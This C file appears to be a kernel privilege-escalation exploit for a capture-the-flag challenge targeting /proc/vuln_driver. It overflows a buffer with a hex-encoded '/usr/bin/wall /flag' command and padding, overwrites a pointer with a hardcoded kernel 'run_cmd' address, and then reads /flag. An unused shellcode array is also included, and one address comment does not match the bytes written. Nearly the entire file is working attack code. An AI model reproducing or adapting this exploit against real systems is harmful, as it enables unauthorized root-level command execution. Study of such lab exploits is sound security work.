#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>

int64_t global_fd;
char global_buf[1024];
char driver[] = "/proc/vuln_driver";

void open_driver() {
        global_fd = open(driver, O_RDWR);
        if (global_fd < 0) {
                printf("[+] Failed to open driver :(\n");
                exit(1);
        } else {
                printf("[+] Driver open\n");
        }
}

void read_flag() {
        int sz;
        global_fd = open("/flag", O_RDONLY);
        sz = read(global_fd, global_buf, sizeof(global_buf));
        if (sz < 0) {
                printf("failed to read flag\n");
        } else {
                close(global_fd);
                printf("%s\n", global_buf);
        }
}

int main() {
        uint8_t s[264];
        int i;
        open_driver();
        char payload[] = { 
                0x48, 0x31, 0xff,
                0x48, 0xc7, 0xc0, 0xd0, 0x90, 0x08, 0x81, 
                0xff, 0xd0,
                0x48, 0x89, 0xc7,
                0x48, 0xc7, 0xc0, 0x90, 0x8d, 0x08, 0x81,
                0xff, 0xd0,
                0xc3 };

        uint8_t f[] = { 0x2f, 0x75, 0x73, 0x72, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x77, 0x61, 0x6c, 0x6c, 0x20, 0x2f, 0x66, 0x6c, 0x61, 0x67, 0x00 };

        for (i = 0; i < sizeof(f); i++) {
                s[i] = f[i];
        }

        for (i; i < sizeof(s)-8; i++) {
                s[i] = 0x41;
        }

        // kernelb: 0xffffffff88200000
        // run_cmd: 0x89580
        // run_cmd: 0xffffffffa6f39580

        s[i] = 0x80;
        s[i+1] = 0x95;
        s[i+2] = 0xe8;
        s[i+3] = 0xa6;
        s[i+4] = 0xff;
        s[i+5] = 0xff;
        s[i+6] = 0xff;
        s[i+7] = 0xff;

        write(global_fd, s, sizeof(s));
        close(global_fd);
        read_flag();
        return 0;
}
